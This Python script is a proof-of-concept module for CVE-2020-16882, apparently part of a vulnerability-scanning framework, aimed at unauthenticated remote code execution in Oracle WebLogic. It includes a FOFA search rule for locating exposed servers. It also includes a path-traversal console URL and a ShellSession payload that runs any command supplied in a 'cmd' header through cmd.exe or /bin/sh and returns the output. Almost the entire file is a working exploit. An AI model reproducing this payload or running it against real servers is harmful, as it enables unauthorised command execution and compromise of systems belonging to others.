#!/usr/bin/env python3
# _*_ coding:utf-8 _*_


import requests
from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='CVE_2020_16882'
AUTHOR = "Faith"
REMARK = 'Weblogic未授权远程代码执行漏洞'
FOFA_RULE='app="Oracle-BEA-WebLogic-Server"'
######################################################

def poc(target):
    result={}
    vuln_url = target + '/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29'
    headers = {"User-Agent":ua}
    data = '''
    GET /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();') HTTP/1.1
    cmd: ls
    Host: 127.0.0.1:7001
    '''
    r = requests.post(vuln_url, headers=headers,data=data,verify=False,timeout=3,proxies=proxies)
    try:
        if r.status_code ==200:
            result['target'] = target
            result['poc'] = NAME
            return result
        else:
            pass
    except:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")